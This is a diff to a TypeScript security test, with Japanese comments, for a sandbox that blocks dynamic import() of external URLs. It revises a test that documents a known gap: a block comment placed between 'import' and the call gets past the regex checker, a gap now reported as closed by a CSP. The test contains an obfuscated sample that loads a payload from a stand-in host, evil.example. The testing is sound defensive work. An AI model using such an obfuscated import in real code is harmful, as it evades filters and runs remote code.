@@ -366,11 +366,15 @@ describe("SB-4: 動的import()による外部URL読み込み", () => {
     });
   });
 
-  it("残存する既知の限界(正規表現ベース静的解析の限界、CSPはT-704のスコープ・本タスクでは未実施): `import`とコンストラクタ呼び出しの間にブロックコメントを挟む難読化は、正規表現の`\\s*`がコメントを空白と見なさないためすり抜ける", () => {
+  it("残存する既知の限界(正規表現ベース静的解析の限界。ネットワーク到達自体はT-704のCSPで解消済み): `import`とコンストラクタ呼び出しの間にブロックコメントを挟む難読化は、正規表現の`\\s*`がコメントを空白と見なさないためすり抜ける", () => {
     // これは`import()`という予約構文固有の弱点ではなく、regexベースの静的解析
-    // 全般に共通する限界(AST解析ならコメントを無視して閉じられる)。
-    // ネットワーク到達性そのものの実効的な担保線はCSP(script-src/connect-src、
-    // T-704のスコープ)であり、findings.mdの次のアクション#3で明記済み。
+    // 全般に共通する限界(AST解析ならコメントを無視して閉じられる)。この
+    // 静的層自体は今も回避可能だが、ネットワーク到達性そのものの実効的な
+    // 担保線はCSP(script-src 'self' blob:、_headers経由でscripts/
+    // generate-worker-csp-headers.mjsが適用)がT-704で実装済みであり、
+    // 実ブラウザ(npm run preview + Playwright)で外部URLへのimport()が
+    // ブロックされることを確認した(tests/security/sandbox-escape-t705-repentest.test.ts
+    // のSB-9参照)。
     const obfuscated = 'import/* comment */("https://evil.example/payload.js")';
     expect(checkForbiddenTokens(obfuscated)).toBeNull();
   });
